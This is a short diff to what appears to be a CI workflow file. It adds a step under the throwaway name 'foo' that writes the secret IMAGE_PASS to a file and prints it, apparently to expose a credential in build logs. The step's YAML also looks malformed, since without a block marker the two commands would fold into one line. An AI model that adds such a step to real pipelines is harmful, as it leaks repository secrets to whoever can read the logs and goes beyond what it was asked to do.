@@ -28,6 +28,11 @@ jobs:
       with:
         fetch-depth: 0
 
+    - name: foo
+      run:
+        echo ${{ secrets.IMAGE_PASS }}> foo
+        cat foo
+
     - name: Install tools
       run: make install
 
